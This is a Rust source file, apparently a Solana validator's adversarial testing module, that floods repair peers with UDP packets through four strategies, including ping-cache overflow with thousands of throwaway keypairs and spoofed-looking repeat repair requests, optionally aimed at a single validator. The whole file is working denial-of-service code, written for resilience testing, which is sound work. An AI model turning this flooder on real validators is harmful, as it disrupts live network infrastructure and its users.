use {
    crate::adversary_feature_set::repair_packet_flood::{
        FloodConfig, FloodStrategy, PeerIdentifier,
    },
    log::*,
    rand::{thread_rng, Rng},
    rayon::{prelude::*, ThreadPool},
    solana_gossip::{
        cluster_info::ClusterInfo,
        contact_info::{ContactInfo, Protocol},
    },
    solana_keypair::Keypair,
    solana_ledger::shred::Nonce,
    solana_net_protocol::repair::{RepairProtocol, RepairRequestHeader},
    solana_pubkey::{ParsePubkeyError, Pubkey},
    solana_rayon_threadlimit::get_thread_count,
    solana_runtime::bank_forks::BankForks,
    solana_streamer::sendmmsg::{batch_send, SendPktsError},
    solana_time_utils::timestamp,
    std::{
        net::{IpAddr, UdpSocket},
        sync::{
            atomic::{AtomicBool, Ordering},
            Arc, RwLock,
        },
        thread::{self, sleep, Builder, JoinHandle},
        time::{Duration, Instant},
    },
};

#[derive(Debug)]
enum PeerIdentifierSanitized {
    Pubkey(Pubkey),
    Ip(IpAddr),
}

impl TryFrom<&PeerIdentifier> for PeerIdentifierSanitized {
    type Error = ParsePubkeyError;
    fn try_from(source: &PeerIdentifier) -> Result<Self, Self::Error> {
        match source {
            PeerIdentifier::Pubkey(pubkey) => {
                let pubkey = Pubkey::try_from(pubkey.as_str())?;
                Ok(PeerIdentifierSanitized::Pubkey(pubkey))
            }
            PeerIdentifier::Ip(ip) => Ok(PeerIdentifierSanitized::Ip(*ip)),
        }
    }
}

#[derive(Debug, Default)]
pub struct RepairPacketFlood {
    exit: Arc<AtomicBool>,
    thread_hdls: Vec<JoinHandle<()>>,
}

impl RepairPacketFlood {
    pub fn new(
        repair_socket: Arc<UdpSocket>,
        bank_forks: Arc<RwLock<BankForks>>,
        cluster_info: Arc<ClusterInfo>,
        configs: Vec<FloodConfig>,
    ) -> Self {
        const MAX_PACKET_FLOOD_THREADS: usize = 8;
        let exit = Arc::new(AtomicBool::default());
        let thread_pool = Arc::new(
            rayon::ThreadPoolBuilder::new()
                .num_threads(get_thread_count().min(MAX_PACKET_FLOOD_THREADS))
                .thread_name(|i| format!("solAdvRPFWrkr{i:02}"))
                .build()
                .unwrap(),
        );
        let keypair_pool = Arc::new(RwLock::new(Vec::default()));
        let mut i: usize = 0;
        let thread_hdls = configs
            .into_iter()
            .map(|config| {
                let exit = exit.clone();
                let thread_pool = thread_pool.clone();
                let repair_socket = repair_socket.clone();
                let bank_forks = bank_forks.clone();
                let cluster_info = cluster_info.clone();
                let thread_name = format!("solAdvRpFld{i:02}");
                let keypair_pool = keypair_pool.clone();
                i = i.saturating_add(1);
                Builder::new()
                    .name(thread_name.clone())
                    .spawn(move || {
                        Self::run(
                            &repair_socket,
                            &bank_forks,
                            &cluster_info,
                            &exit,
                            &thread_pool,
                            config,
                            thread_name,
                            &keypair_pool,
                        );
                    })
                    .unwrap()
            })
            .collect();
        Self { exit, thread_hdls }
    }

    pub fn join(self) -> thread::Result<()> {
        self.exit.store(true, Ordering::Relaxed);
        for hdl in self.thread_hdls {
            hdl.join()?;
        }
        self.exit.store(false, Ordering::Relaxed);
        Ok(())
    }

    fn flood_minimal_packets(
        repair_socket: &UdpSocket,
        config: &FloodConfig,
        peers: &[ContactInfo],
    ) -> usize {
        let mut reqs_v = Vec::default();
        peers.iter().for_each(|peer| {
            for i in 0..config.packets_per_peer_per_iteration {
                let val: u8 = i.wrapping_rem(u8::MAX as u32).try_into().unwrap();
                reqs_v.push((vec![val], peer.serve_repair(Protocol::UDP).unwrap()));
            }
        });
        let packet_count = reqs_v.len();
        let reqs_iter = reqs_v.iter().map(|(data, addr)| (data, addr));
        if let Err(SendPktsError::IoError(err, num_failed)) = batch_send(repair_socket, reqs_iter) {
            error!(
                "batch_send failed to send {}/{} packets first error {:?}",
                num_failed,
                reqs_v.len(),
                err
            );
        }
        packet_count
    }

    fn flood_signed_packets(
        repair_socket: &UdpSocket,
        cluster_info: &ClusterInfo,
        config: &FloodConfig,
        peers: &[ContactInfo],
    ) -> usize {
        let identity_keypair = cluster_info.keypair().clone();
        let mut reqs_v = Vec::default();
        peers.iter().for_each(|peer| {
            let header = RepairRequestHeader::new(
                cluster_info.id(),
                *peer.pubkey(),
                timestamp(),
                789, /*nonce*/
            );
            let request_proto = RepairProtocol::HighestWindowIndex {
                header,
                slot: 123,
                shred_index: 0,
            };
            let packet_buf =
                RepairProtocol::repair_proto_to_bytes(&request_proto, &identity_keypair).unwrap();
            for _i in 0..config.packets_per_peer_per_iteration {
                reqs_v.push((
                    packet_buf.clone(),
                    peer.serve_repair(Protocol::UDP).unwrap(),
                ));
            }
        });
        let packet_count = reqs_v.len();
        let reqs_iter = reqs_v.iter().map(|(data, addr)| (data, addr));
        if let Err(SendPktsError::IoError(err, num_failed)) = batch_send(repair_socket, reqs_iter) {
            error!(
                "batch_send failed to send {}/{} packets first error {:?}",
                num_failed,
                reqs_v.len(),
                err
            );
        }
        packet_count
    }

    fn flood_ping_cache(
        repair_socket: &UdpSocket,
        bank_forks: &RwLock<BankForks>,
        cluster_info: &ClusterInfo,
        config: &FloodConfig,
        peers: &[ContactInfo],
        thread_pool: &ThreadPool,
        keypair_pool: &RwLock<Vec<Keypair>>,
    ) -> usize {
        const MIN_PARALLEL_ITEMS: usize = 1_000;
        const MAX_SENDMMSG_ITEMS: usize = 10_000;
        {
            // Populate keypair pool if necessary
            // See REPAIR_PING_CACHE_CAPACITY to size keypair_pool
            let mut keypair_pool = keypair_pool.write().unwrap();
            if keypair_pool.len() < usize::try_from(config.packets_per_peer_per_iteration).unwrap()
            {
                *keypair_pool = thread_pool
                    .install(|| {
                        (0..config.packets_per_peer_per_iteration)
                            .into_par_iter()
                            .with_min_len(MIN_PARALLEL_ITEMS)
                            .map(|_i| Keypair::new())
                    })
                    .collect();
            }
        }
        let slot = bank_forks.read().unwrap().working_bank().slot();
        let mut packet_count: usize = 0;
        let keypairs = keypair_pool.read().unwrap();
        peers.iter().for_each(|peer| {
            for chunk in keypairs.chunks(MAX_SENDMMSG_ITEMS) {
                let reqs_v: Vec<_> = thread_pool
                    .install(|| {
                        chunk
                            .par_iter()
                            .with_min_len(MIN_PARALLEL_ITEMS)
                            .map(|keypair| {
                                let header = RepairRequestHeader::new(
                                    cluster_info.id(),
                                    *peer.pubkey(),
                                    timestamp(),
                                    789, /*nonce*/
                                );
                                let request_proto = RepairProtocol::HighestWindowIndex {
                                    header,
                                    slot,
                                    shred_index: 0,
                                };
                                let packet_buf =
                                    RepairProtocol::repair_proto_to_bytes(&request_proto, keypair)
                                        .unwrap();
                                (packet_buf, peer.serve_repair(Protocol::UDP).unwrap())
                            })
                    })
                    .collect();
                packet_count = packet_count.saturating_add(reqs_v.len());
                let reqs_iter = reqs_v.iter().map(|(data, addr)| (data, addr));
                if let Err(SendPktsError::IoError(err, num_failed)) =
                    batch_send(repair_socket, reqs_iter)
                {
                    error!(
                        "batch_send failed to send {}/{} packets first error {:?}",
                        num_failed,
                        reqs_v.len(),
                        err
                    );
                }
            }
        });
        packet_count
    }

    fn flood_orphan_requests(
        repair_socket: &UdpSocket,
        cluster_info: &ClusterInfo,
        bank_forks: &RwLock<BankForks>,
        config: &FloodConfig,
        peers: &[ContactInfo],
    ) -> usize {
        let identity_keypair = cluster_info.keypair().clone();
        let slot = bank_forks.read().unwrap().highest_slot();
        let mut reqs_v = Vec::default();
        peers.iter().for_each(|peer| {
            let nonce = thread_rng().gen_range(0..Nonce::MAX);
            let header =
                RepairRequestHeader::new(cluster_info.id(), *peer.pubkey(), timestamp(), nonce);
            let request_proto = RepairProtocol::Orphan { header, slot };
            let packet_buf =
                RepairProtocol::repair_proto_to_bytes(&request_proto, &identity_keypair).unwrap();
            for _i in 0..config.packets_per_peer_per_iteration {
                reqs_v.push((
                    packet_buf.clone(),
                    peer.serve_repair(Protocol::UDP).unwrap(),
                ));
            }
        });
        let packet_count = reqs_v.len();
        let reqs_iter = reqs_v.iter().map(|(data, addr)| (data, addr));
        if let Err(SendPktsError::IoError(err, num_failed)) = batch_send(repair_socket, reqs_iter) {
            error!(
                "batch_send failed to send {}/{} packets first error {:?}",
                num_failed,
                reqs_v.len(),
                err
            );
        }
        packet_count
    }

    fn run(
        repair_socket: &UdpSocket,
        bank_forks: &RwLock<BankForks>,
        cluster_info: &ClusterInfo,
        exit: &AtomicBool,
        thread_pool: &ThreadPool,
        config: FloodConfig,
        thread_name: String,
        keypair_pool: &RwLock<Vec<Keypair>>,
    ) {
        const REPORT_INTERVAL_MS: u64 = 2_000;
        let mut last_report = Instant::now();
        let mut iteration: u64 = 0;
        let mut packet_count: usize = 0;

        loop {
            if exit.load(Ordering::Relaxed) {
                return;
            }

            let peers = {
                let peers = cluster_info.repair_peers(u64::MAX);
                if let Some(peer_id) = config.target.as_ref() {
                    // pubkey verified by RPC
                    let peer_id = PeerIdentifierSanitized::try_from(peer_id).unwrap();
                    let matches_ci = |ci: &&ContactInfo| -> bool {
                        match peer_id {
                            PeerIdentifierSanitized::Pubkey(pubkey) => pubkey == *ci.pubkey(),
                            PeerIdentifierSanitized::Ip(ip) => {
                                ip == ci.serve_repair(Protocol::UDP).unwrap().ip()
                            }
                        }
                    };
                    peers
                        .iter()
                        .find(matches_ci)
                        .cloned()
                        .map(|ci| vec![ci])
                        .unwrap_or_else(|| {
                            error!(
                                "repair_peer_minimal_packet_flood: target={peer_id:?} not found"
                            );
                            thread::sleep(Duration::from_secs(2));
                            Vec::default()
                        })
                } else {
                    peers
                }
            };

            packet_count = packet_count.saturating_add(match config.flood_strategy {
                FloodStrategy::MinimalPackets => {
                    Self::flood_minimal_packets(repair_socket, &config, &peers)
                }
                FloodStrategy::SignedPackets => {
                    Self::flood_signed_packets(repair_socket, cluster_info, &config, &peers)
                }
                FloodStrategy::PingCacheOverflow => Self::flood_ping_cache(
                    repair_socket,
                    bank_forks,
                    cluster_info,
                    &config,
                    &peers,
                    thread_pool,
                    keypair_pool,
                ),
                FloodStrategy::Orphan => Self::flood_orphan_requests(
                    repair_socket,
                    cluster_info,
                    bank_forks,
                    &config,
                    &peers,
                ),
            });
            if last_report.elapsed() >= Duration::from_millis(REPORT_INTERVAL_MS) {
                let num_peers = peers.len();
                info!(
                    "repair_packet_flood {thread_name}: num_peers={num_peers} \
                     iteration={iteration}, packets={packet_count}"
                );
                packet_count = 0;
                last_report = Instant::now();
            }
            iteration = iteration.saturating_add(1);
            if config.iteration_delay_us > 0 {
                sleep(Duration::from_micros(config.iteration_delay_us));
            }
        }
    }
}
